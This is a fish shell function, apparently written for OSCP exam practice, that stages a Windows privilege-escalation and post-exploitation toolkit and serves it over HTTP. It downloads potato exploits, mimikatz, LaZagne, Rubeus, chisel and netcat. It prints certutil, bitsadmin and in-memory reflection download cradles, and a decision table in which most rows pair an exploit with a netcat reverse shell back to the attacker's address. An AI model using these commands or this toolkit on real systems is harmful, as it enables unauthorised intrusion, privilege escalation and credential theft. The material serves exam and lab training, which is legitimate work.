function winpwn --description "stage the windows privesc toolkit and serve it over http"
    set -l dir ~/tools/win
    set -l cache $dir/.cache
    set -l port 7331
    set -l want ""

    # ---- args -------------------------------------------------------------
    set -l i 1
    while test $i -le (count $argv)
        switch $argv[$i]
            case --port
                set i (math $i + 1)
                set port $argv[$i]
            case --cmd
                set i (math $i + 1)
                set want $argv[$i]
            case -h --help
                echo "usage: winpwn [--port N] [--cmd ALIAS]"
                echo "  --port N     serve on N instead of 7331 (four digits, unprivileged)"
                echo "  --cmd ALIAS  print every transfer method for one tool, do not serve"
                return 0
            case '*'
                echo "[!] unknown option: $argv[$i]"
                return 1
        end
        set i (math $i + 1)
    end

    if not string match -qr '^\d{4}$' -- $port
        echo "[!] port must be four digits, got '$port'"
        return 1
    end
    if contains -- $port 1337 4444 9001
        echo "[!] $port is one of your handler ports, pick another"
        return 1
    end

    # tun0 first, so a payload never gets the ethernet address
    set -l ip (ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
    test -z "$ip"; and set ip (ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
    test -z "$ip"; and set ip 127.0.0.1

    set -l sc https://raw.githubusercontent.com/Flangvik/SharpCollection/master
    set -l gh https://github.com

    # ---- the toolkit ------------------------------------------------------
    # alias | staged name | method | a | b
    #   url    a=url
    #   sc     a=SharpCollection subpath
    #   zip    a=archive url   b=member inside it
    #   api    a=repo          b=perl regex picking the asset
    #   apim   a=repo|regex    b=member inside the archive
    #   local  a=kali path     b=fallback url
    #   manual a=why
    set -l tools \
        "jp64|JuicyPotato-x64.exe|url|$gh/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe|" \
        "jp32|JuicyPotato-x86.exe|manual|upstream ships x64 only, no official x86 build|" \
        "jpng|JuicyPotatoNG-x64.exe|zip|$gh/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip|*JuicyPotatoNG.exe" \
        "ps32|PrintSpoofer-x86.exe|url|$gh/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe|" \
        "ps64|PrintSpoofer-x64.exe|url|$gh/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe|" \
        "gp2|GodPotato-net2-x64.exe|url|$gh/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe|" \
        "gp35|GodPotato-net35-x64.exe|url|$gh/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe|" \
        "gp4|GodPotato-net4-x64.exe|url|$gh/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe|" \
        "sig|SigmaPotato-net4-x64.exe|url|$gh/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe|" \
        "sw32|SweetPotato-net47-x86.exe|sc|NetFramework_4.7_x86/SweetPotato.exe|" \
        "sw64|SweetPotato-net47-x64.exe|sc|NetFramework_4.7_x64/SweetPotato.exe|" \
        "rp|RoguePotato-x64.exe|zip|$gh/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip|*RoguePotato.exe" \
        "efs|SharpEfsPotato-x64.exe|manual|no release and not in SharpCollection, build from bugch3ck/SharpEfsPotato|" \
        "rot|RottenPotatoNG-x64.exe|manual|repo ships MSVC build artifacts only, superseded by the others|" \
        "fp|FullPowers-x64.exe|url|$gh/itm4n/FullPowers/releases/latest/download/FullPowers.exe|" \
        "rcs|RunasCs-net4-x64.exe|zip|$gh/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip|RunasCs.exe" \
        "smv|SeManageVolumeExploit-x64.exe|url|$gh/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe|" \
        "sra|SeRestoreAbuse-x64.exe|manual|no release binary, build from xct/SeRestoreAbuse|" \
        "sbpc|SeBackupPrivilegeCmdLets.dll|url|$gh/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll|" \
        "sbpu|SeBackupPrivilegeUtils.dll|url|$gh/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll|" \
        "wp32|winPEAS-x86.exe|local|/usr/share/peass/winpeas/winPEASx86.exe|$gh/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" \
        "wp64|winPEAS-x64.exe|local|/usr/share/peass/winpeas/winPEASx64.exe|$gh/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" \
        "wpa|winPEAS-any.exe|local|/usr/share/peass/winpeas/winPEASany.exe|$gh/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe" \
        "wpo64|winPEAS-x64-ofs.exe|local|/usr/share/peass/winpeas/winPEASx64_ofs.exe|$gh/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe" \
        "wpoa|winPEAS-any-ofs.exe|local|/usr/share/peass/winpeas/winPEASany_ofs.exe|$gh/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" \
        "sb32|Seatbelt-net40-x86.exe|sc|NetFramework_4.0_x86/Seatbelt.exe|" \
        "sb64|Seatbelt-net47-x64.exe|sc|NetFramework_4.7_x64/Seatbelt.exe|" \
        "su32|SharpUp-net40-x86.exe|sc|NetFramework_4.0_x86/SharpUp.exe|" \
        "su64|SharpUp-net47-x64.exe|sc|NetFramework_4.7_x64/SharpUp.exe|" \
        "wat32|Watson-net40-x86.exe|sc|NetFramework_4.0_x86/Watson.exe|" \
        "wat64|Watson-net47-x64.exe|sc|NetFramework_4.7_x64/Watson.exe|" \
        "pc|PrivescCheck.ps1|url|$gh/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1|" \
        "pu|PowerUp.ps1|url|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1|" \
        "ac32|accesschk-x86.exe|zip|https://download.sysinternals.com/files/AccessChk.zip|accesschk.exe" \
        "ac64|accesschk-x64.exe|zip|https://download.sysinternals.com/files/AccessChk.zip|accesschk64.exe" \
        "wes|wes.py|url|https://raw.githubusercontent.com/bitsadmin/wesng/master/wes.py|" \
        "mk32|mimikatz-x86.exe|zip|$gh/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip|Win32/mimikatz.exe" \
        "mk64|mimikatz-x64.exe|zip|$gh/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip|x64/mimikatz.exe" \
        "sk32|SafetyKatz-net40-x86.exe|sc|NetFramework_4.0_x86/SafetyKatz.exe|" \
        "sk64|SafetyKatz-net47-x64.exe|sc|NetFramework_4.7_x64/SafetyKatz.exe|" \
        "dp32|SharpDPAPI-net40-x86.exe|sc|NetFramework_4.0_x86/SharpDPAPI.exe|" \
        "dp64|SharpDPAPI-net47-x64.exe|sc|NetFramework_4.7_x64/SharpDPAPI.exe|" \
        "lz|lazagne-x86.exe|url|$gh/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe|" \
        "rub32|Rubeus-net40-x86.exe|sc|NetFramework_4.0_x86/Rubeus.exe|" \
        "rub64|Rubeus-net47-x64.exe|sc|NetFramework_4.7_x64/Rubeus.exe|" \
        "shnd|SharpHound-net47-x64.exe|sc|NetFramework_4.7_x64/SharpHound.exe|" \
        "shce|SharpHound-CE-x86.exe|apim|SpecterOps/SharpHound|SharpHound_v[0-9.]+_windows_x86\.zip\$|SharpHound.exe" \
        "pv|PowerView.ps1|url|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1|" \
        "sv32|SharpView-net47-x86.exe|sc|NetFramework_4.7_x86/SharpView.exe|" \
        "sv64|SharpView-net47-x64.exe|sc|NetFramework_4.7_x64/SharpView.exe|" \
        "kerb|Invoke-Kerberoast.ps1|url|https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1|" \
        "pm|Powermad.ps1|url|https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1|" \
        "ch32|chisel-windows-x86.exe|apim|jpillora/chisel|windows_386\.zip\$|chisel.exe" \
        "ch64|chisel-windows-x64.exe|apim|jpillora/chisel|windows_amd64\.zip\$|chisel.exe" \
        "chlin|chisel-linux-x64|apim|jpillora/chisel|linux_amd64\.gz\$|" \
        "ag|ligolo-agent-windows-x64.exe|apim|nicocha30/ligolo-ng|agent_[0-9.]+_windows_amd64\.zip\$|agent.exe" \
        "lgp|ligolo-proxy-linux-x64|apim|nicocha30/ligolo-ng|proxy_[0-9.]+_linux_amd64\.tar\.gz\$|proxy" \
        "socat|socat-linux-x86_64|url|$gh/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64|" \
        "pl|plink-x64.exe|url|https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe|" \
        "pse|PsExec64.exe|zip|https://download.sysinternals.com/files/PSTools.zip|PsExec64.exe" \
        "pd32|procdump-x86.exe|zip|https://download.sysinternals.com/files/Procdump.zip|procdump.exe" \
        "pd64|procdump-x64.exe|zip|https://download.sysinternals.com/files/Procdump.zip|procdump64.exe" \
        "nc|nc-x86.exe|local|/usr/share/windows-resources/binaries/nc.exe|$gh/int0x33/nc.exe/raw/master/nc.exe" \
        "nc64|nc-x64.exe|local|/usr/share/windows-resources/binaries/nc64.exe|$gh/int0x33/nc.exe/raw/master/nc64.exe" \
        "tcb|test_clsid.bat|url|https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat|"

    set -l wt "C:\Windows\Temp"      # kept in a var: "\$a" in a fish string eats the variable

    # ---- --cmd: every transfer method for one tool, no server -------------
    if test -n "$want"
        for t in $tools
            set -l p (string split '|' $t)
            test "$p[1]" = "$want"; or continue

            set -l ext (string match -r '\.[^.]+$' -- $p[2])
            set -l a "$want$ext"
            set -l u "http://$ip:$port/$a"

            echo
            echo "[*] $want  ->  $p[2]"
            echo
            echo "  certutil"
            echo "    certutil -urlcache -split -f $u $wt\\$a"
            echo "  powershell webclient"
            echo "    powershell -c (New-Object Net.WebClient).DownloadFile('$u','$wt\\$a')"
            echo "  powershell iwr"
            echo "    powershell iwr $u -o $wt\\$a"
            echo "  curl              (Win10 1803+ only, absent on Server 2016 and older)"
            echo "    curl $u -o $a"
            echo "  bitsadmin"
            echo "    bitsadmin /transfer j /download /priority high $u $wt\\$a"
            if string match -qr 'net[0-9]|winPEAS' -- $p[2]
                echo "  reflection        (.NET, never touches disk)"
                echo "    powershell -c \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$u')).EntryPoint.Invoke(\$null,(,[string[]]@()))\""
            end
            echo
            return 0
        end
        echo "[!] no such alias: $want   (run winpwn with no args to see the table)"
        return 1
    end

    # ---- stage ------------------------------------------------------------
    mkdir -p $dir $cache $dir/clsid
    set -l missing

    for t in $tools
        set -l p (string split '|' $t)
        set -l al $p[1]
        set -l real $p[2]
        set -l how $p[3]
        set -l dest $dir/$real

        if test -f $dest
            # already staged, never re-download
        else
            switch $how
                case url
                    echo "[*] fetching $real"
                    __winpwn_get $p[4] $dest; or set -a missing "$real  ($p[4])"
                case sc
                    echo "[*] fetching $real"
                    __winpwn_get "$sc/$p[4]" $dest; or set -a missing "$real  ($sc/$p[4])"
                case zip
                    echo "[*] unpacking $real"
                    __winpwn_member $cache $p[4] $p[5] $dest; or set -a missing "$real  ($p[4])"
                case apim
                    echo "[*] resolving $real"
                    set -l u (__winpwn_ghurl $p[4] $p[5])
                    if test -z "$u"
                        set -a missing "$real  (no asset matching $p[5] in $p[4])"
                    else if test -n "$p[6]"
                        __winpwn_member $cache $u $p[6] $dest; or set -a missing "$real  ($u)"
                    else
                        __winpwn_member $cache $u '' $dest; or set -a missing "$real  ($u)"
                    end
                case local
                    if test -f $p[4]
                        echo "[*] copying $real from "(dirname $p[4])
                        cp $p[4] $dest
                    else
                        echo "[*] fetching $real  (not on this box, pulling upstream)"
                        __winpwn_get $p[5] $dest; or set -a missing "$real  ($p[5])"
                    end
                case manual
                    set -a missing "$real  -- $p[4]"
            end
        end

        # short alias next to the descriptive name, same extension.
        # skip when the alias IS the real name, else ln -sf points the file at
        # itself and eats it (wes -> wes.py)
        if test -f $dest
            set -l ext (string match -r '\.[^.]+$' -- $real)
            test "$al$ext" != "$real"; and ln -sf $real "$dir/$al$ext"
        end
    end

    # CLSID lists, one dir per Windows build
    for w in Windows_7_Enterprise Windows_10_Enterprise Windows_Server_2008_R2_Enterprise \
             Windows_Server_2012_Datacenter Windows_Server_2016_Standard
        if not test -f $dir/clsid/$w.list
            echo "[*] fetching CLSID list $w"
            __winpwn_get "https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/$w/CLSID.list" \
                $dir/clsid/$w.list; or set -a missing "clsid/$w.list"
        end
    end
    chmod +x $dir/*.exe $dir/socat-* $dir/chisel-linux* $dir/ligolo-proxy* 2>/dev/null

    # ---- what OffSec forbids, so I don't build the wrong reflexes ----------
    printf '%s\n' \
        "Banned in the OSCP exam. Do not practise these as your default move." \
        "" \
        "  sqlmap                  banned outright" \
        "  Nessus                  banned outright" \
        "  Metasploit / meterpreter / msfvenom auto-exploit" \
        "                          one machine only, your single permitted target" \
        "  any automatic exploitation tool" \
        "                          if it finds AND exploits for you, it is out" \
        "" \
        "  spoofing and poisoning of any kind:" \
        "    Responder in poisoning mode (-r/-w/-f, LLMNR/NBT-NS/MDNS answers)" \
        "    mitm6" \
        "    ARP spoofing, DNS spoofing" \
        "                          banned no matter how many cheatsheets show them." \
        "                          Responder in ANALYZE mode (-A) is passive and fine." \
        "" \
        "Not staged here on purpose: ADCS tooling (Certipy, ESC1-8 helpers)." \
        "Absent from the published body of knowledge, so it is noise for this exam." \
        > $dir/EXAM-BANNED.txt

    # ---- alias table ------------------------------------------------------
    echo
    echo "  ── aliases ── serve on :$port, browse "(string replace ~ '~' $dir)" ──"
    for t in $tools
        set -l p (string split '|' $t)
        set -l ext (string match -r '\.[^.]+$' -- $p[2])
        if test -f $dir/$p[2]
            printf "  %-9s %s\n" "$p[1]$ext" $p[2]
        else
            printf "  %-9s %s  [MISSING]\n" "$p[1]$ext" $p[2]
        end
    end

    # ---- potato decision table -------------------------------------------
    echo
    echo "  ── whoami /priv shows SeImpersonate or SeAssignPrimaryToken? then a potato works ──"
    echo
    echo "  Win 7-10 (<=1803), Server 2008-2016   JuicyPotato      needs -c CLSID"
    echo "    jp64.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c nc.exe $ip 443 -e cmd\" -t * -c {CLSID}"
    echo "    pick the CLSID from clsid/<build>.list, 2008 R2 alone has 366, brute them with tcb.bat"
    echo
    echo "  Win 10 x64 (1809+)                    PrintSpoofer     needs Spooler running"
    echo "    ps64.exe -i -c \"nc.exe $ip 443 -e cmd\""
    echo
    echo "  Win 10 x86                            SweetPotato"
    echo "    sw32.exe -a \"nc.exe $ip 443 -e cmd\""
    echo
    echo "  Win 11, Server 2019-2022              GodPotato / SigmaPotato"
    echo "    gp4.exe -cmd \"nc.exe $ip 443 -e cmd\"        (gp2.exe / gp35.exe on older .NET)"
    echo "    sig.exe --revshell $ip 443"
    echo
    echo "  Spooler stopped and JuicyPotato dead  RoguePotato      needs a redirector on you"
    echo "    you:    socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999"
    echo "    target: rp.exe -r $ip -e \"nc.exe $ip 443 -e cmd\" -l 9999"
    echo
    echo "  Service account with NO SeImpersonate FullPowers first, then a potato"
    echo "    fp.exe -c \"cmd /c nc.exe $ip 443 -e cmd\" -z"
    echo

    # ---- fetch commands ---------------------------------------------------
    echo "  ── certutil works Server 2003 and up. winpwn --cmd ALIAS for the other methods ──"
    for t in $tools
        set -l p (string split '|' $t)
        test -f $dir/$p[2]; or continue
        set -l ext (string match -r '\.[^.]+$' -- $p[2])
        set -l a "$p[1]$ext"
        echo "  certutil -urlcache -split -f http://$ip:$port/$a $wt\\$a"
    end

    # ---- what did not land ------------------------------------------------
    if test (count $missing) -gt 0
        echo
        echo "  ── "(count $missing)" missing, grab these by hand ──"
        for m in $missing
            echo "  [!] $m"
        end
    end

    echo
    echo "[*] serving $dir on http://$ip:$port  (ctrl-c to stop)"
    __run python3 -m http.server $port --directory $dir --bind 0.0.0.0
end
